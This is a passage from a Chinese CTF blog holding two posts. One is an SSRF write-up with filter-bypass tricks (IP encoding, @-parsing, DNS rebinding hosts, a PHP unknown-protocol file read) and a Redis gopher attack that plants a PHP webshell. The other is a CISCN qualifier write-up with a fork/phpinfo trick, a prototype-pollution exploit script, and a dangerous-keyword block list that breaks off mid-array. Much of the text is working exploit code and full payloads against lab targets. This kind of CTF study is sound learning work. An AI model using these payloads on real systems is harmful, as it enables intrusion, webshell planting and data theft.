<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>    </span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">eval</span>($a); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data:text/plain;base64,cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<ul>
<li>IP限制绕过</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">115.239</span><span class="number">.210</span><span class="number">.26</span>  &gt;&gt;&gt;  <span class="number">16373751032</span></span><br><span class="line">首先把这四段数字给分别转成<span class="number">16</span>进制，结果：<span class="number">73</span> ef d2 <span class="number">1</span>a</span><br><span class="line">然后把 <span class="number">73</span>efd21a 这十六进制一起转换成<span class="number">8</span>进制</span><br><span class="line">记得访问的时候加<span class="number">0</span>表示使用八进制(可以是一个<span class="number">0</span>也可以是多个<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  &gt;&gt;&gt;  http://<span class="number">2130706433</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>解析url的绕过</li>
</ul>
<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<code>www.baidu.com</code>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<code>www.baidu.com</code>，而实际上这个URL所请求的内容都是127.0.0.1上的内容。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<p>这里要注意的是在对@解析域名中，不同的处理函数存在处理差异，例如： <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，在PHP的parse_url中会识别<code>www.ccc.com</code>，而libcurl则识别为<code>www.bbb.com</code>。</p>
<ul>
<li>定制DNS服务</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://xip.io/</span><br><span class="line">http://nip.io/</span><br><span class="line">https://ip6.name/</span><br><span class="line">https://sslip.io/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io/</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>封闭式数字字母</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>短地址绕过</li>
</ul>
<p>通过短地址的方式来绕过，短地址生成网站：<a href="https://tinyurl.com/">https://tinyurl.com/</a></p>
<h1 id="ssrf怎么防"><a href="#ssrf怎么防" class="headerlink" title="ssrf怎么防"></a><strong>ssrf怎么防</strong></h1><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于 <code>file://</code>, <code>gopher://</code>, <code>ftp://</code> 等引起的问题。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h1><p>这些题目都是以前复现的题目，当时看的云里雾里，现在回头来看又加深了理解。</p>
<h2 id="SSRF的PHP黑魔法"><a href="#SSRF的PHP黑魔法" class="headerlink" title="SSRF的PHP黑魔法"></a><strong>SSRF的PHP黑魔法</strong></h2><p>这是hhhm师傅出的题目三座大山</p>
<p>做这道题目之前先来了解一下SSRF的PHP黑魔法，<code>file_get_contents()</code>函数如果输入一个不存在的协议名，会爆出一个warning，然后导致目录穿越，从而实现SSRF攻击，比如我们请求一个PHP无法识别的协议，比如<code>abc://</code>，那么他就会就被PHP识别为了一个目录，如果要读取同目录下的index.php，就要用<code>abc://../injiahsdex.php</code>来进行读取。这样做的目的就是可以在SSRF的众多协议被ban的情况下来进行读取文件。</p>
<p>回到题目，首先按照示例输入one，输出一张风景画，依照提示可知输入two，three同理会有图片，fuzz一下发现有提示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">can you pass it and then read index.php? </span><br></pre></td></tr></table></figure>

<p>读文件的话一般是ssrf，从fuzz的结果会发现输入协议相关的内容就会被过滤掉，其中过滤了如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:</span><br></pre></td></tr></table></figure>

<p>这时候利用php的黑魔法<code>abc://../index.php</code>就可以读取本地的index.php。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$name = $_GET[<span class="string">&quot;num&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($name===<span class="string">&quot;one&quot;</span>||$name===<span class="string">&quot;two&quot;</span>||$name===<span class="string">&quot;three&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = <span class="string">&quot;tour/<span class="subst">$name</span>.php&quot;</span>;</span><br><span class="line">         <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:|input|filter|flag/i&#x27;</span>,$name))</span><br><span class="line">          &#123;</span><br><span class="line">            $url=file_get_contents($name);</span><br><span class="line">            <span class="keyword">echo</span>($url);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can you pass it and then read index.php? &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;!---next c2Vzcw==.php--&gt; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>这道题目后面还有一部分无参数，不涉及SSRF这里就不提了。</p>
<h2 id="Redis-SSRF-getshell"><a href="#Redis-SSRF-getshell" class="headerlink" title="Redis SSRF getshell"></a><strong>Redis SSRF getshell</strong></h2><p>buu题目EZ三剑客-EzWeb，首先得到的页面是一个输入框</p>
<p>当我们输入<code>file:///etc/passwd</code>的时候，下方提示别这样，应该是过滤了file协议，这里可以使用<code>file:&lt;空格&gt;///</code>绕过，成功回显，基本上可以确定有SSRF漏洞了。然后我们再使用file协议读取源码试一下，在输入框输入<code>file: ///var/www/html/index.php</code>，成功获取源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到经过了一个正则的匹配才可以<code>curl($url);</code>。</p>
<p>从正则可以看出过滤了<code>file://</code>，<code>dict</code>，<code>127.0.0.1</code>，<code>localhost</code>，<code>../</code>但是没有过滤http协议和gopher协议。看到如果get传值secret会执行ifconfig。</p>
<p>按F12在有个注释也可以发现?secret，访问?secret得到本机ip</p>
<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>写个脚本探测内网</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>跑出结果4 5 6 7 10 11，一个一个试，11的时候给出了提示，当然这里不用写脚本，用burp去爆破也是可以的。</p>
<p>获取到地址之后，然后用burp爆破端口。</p>
<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloads选numbers爆破1到65535端口，线程选1。一般来说猜测是6379端口（redis）或3306端口（mysql），当然爆破出结果是6374。</p>
<p>因为输入url这里只限制了<code>file://</code>，没有ban掉<code>gopher://</code>，很容易想到是Redis SSRF getshell。</p>
<p>这里直接用别人写好的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>在输入框直接打进去。会在根目录下生成个文件shell.php，然后访问173.17.51.11/shell.php即可得到flag。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>ciscn初赛</title>
    <url>/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>一次躺赢的比赛</p>
<p>一队wp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">传送门</a></p>
<p>y1ng师傅wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">传送门</a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">   $pid = pcntl_fork();</span><br><span class="line">   <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="comment">// 创建子进程错误，返回-1</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">       <span class="comment">// 父进程会得到子进程号，所以这里是父进程执行的逻辑</span></span><br><span class="line">       $r=pcntl_wait($status);</span><br><span class="line">       <span class="comment">// 父进程必须等待一个子进程退出后，再创建下一个子进程。</span></span><br><span class="line">       <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;<span class="comment">//检查状态代码是否代表一个正常的退出。</span></span><br><span class="line">           <span class="comment">//返回值当子进程状态代码代表正常退出时返回 TRUE ,其他情况返回 FALSE。</span></span><br><span class="line">           phpinfo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">           call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">       <span class="comment">//向当前进程发送SIGUSR1信号</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>主要是想进入<code>phpinfo</code>这里子句里面，也就是要让<code>pcntl_wifexited($status)</code>为FALSE</p>
<p>可以给a传<code>fsockopen</code>造成异步，使得当前线程退出，父线程就运行了<code>phpinfo</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjibnmrjlx4.cloudeci1.ichunqiu.com/?a=fsockopen&amp;b=1</span><br></pre></td></tr></table></figure>

<p>在phpinfo页面发现flag。</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h2><p>给了源码附件，关键代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到路由<code>/DeveloperControlPanel</code>如果<code>Admin[key] === password</code>就会输出<code>flag</code>，然后</p>
<p>路由<code>/Privilege</code>先检查<code>req.session.knight </code>，<code>req.body.NewAttributeKey</code>，<code>req.body.NewAttributeValue</code>是否未定义，当然这里的<code>key</code>和<code>value</code>都是可控的，然后下面有个关键点就是<code>setFn(req.session.knight, key, value);</code>这里<code>setFn</code>用了<code>require(&#39;set-value&#39;);</code>这个模块。也就是往<code>req.session.knight</code>添加一个键值对。</p>
<p>这里想到用原型链污染，进行污染对象原型，从而可以修改Admin的key和password。</p>
<p>先访问<code>/SpawnPoint</code>生成<code>session</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>ze9505q64pi62k5m16h.cloudeci1.ichunqiu.com:<span class="number">8888</span>/SpawnPoint</span><br></pre></td></tr></table></figure>

<p>然后在<code>Privilege</code>进行原型链污染，再在<code>/DeveloperControlPanel</code>输入值即可获取flag。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;__jsluid_h=b34fa3669aa578dc0618e3f9aa1c3a45; session=s:zvjsKzwgmvmxjeoGEWv8F5SimfB6LlQD.YrK/DLOjKSGHC2HJpOHGiV/cmaurt2/fpbrwMle3nLM&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/Privilege&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;NewAttributeKey&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;NewAttributeValue&quot;</span>:<span class="string">&#x27;__proto__.[abcd]&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span 